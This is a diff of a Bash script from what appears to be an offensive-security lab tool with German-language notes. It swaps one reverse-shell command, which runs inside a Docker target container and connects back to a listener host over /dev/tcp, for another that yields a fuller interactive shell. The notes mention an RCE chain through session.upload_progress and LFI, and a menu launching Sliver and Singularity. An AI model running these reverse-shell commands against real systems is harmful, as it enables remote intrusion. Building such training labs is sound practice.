@@ -81,13 +81,13 @@ engage_lab_foothold_exec_rce() {
 engage_lab_foothold_direct_shell() {
   local lhost="$1" lport="$2" c
   c="$(engage_lab_foothold_container)"
-  docker exec -d "$c" bash -c "bash -i >& /dev/tcp/${lhost}/${lport} 0>&1"
+  docker exec -d "$c" bash -c "exec 3<>/dev/tcp/${lhost}/${lport}; exec script -qf -c /bin/bash /dev/null <&3 >&3 2>&3"
 }
 
 engage_lab_foothold_note() {
   cat <<'NOTE'
-[foothold-lab] RCE-Kette (session.upload_progress + LFI) → Ziel führt bash /dev/tcp Reverse-Shell aus.
-  Erwartung: Fenster **listener** im tmux zeigt connect + Prompt (www-data).
-  Kein Connect: Prüfe `docker logs vtbw-php2shell-target` nach dem RCE-Lauf.
+[foothold-lab] Shell liegt im Fenster „PHP2SHELL shell“.
+  Root-Dateisystem des Lab-Containers ist read-only. Beschreibbar: /tmp
+  exit in der Shell öffnet dort das Menü: 2 Sliver, 3 Singularity, 4 LOAD, 5 URLs.
 NOTE
 }
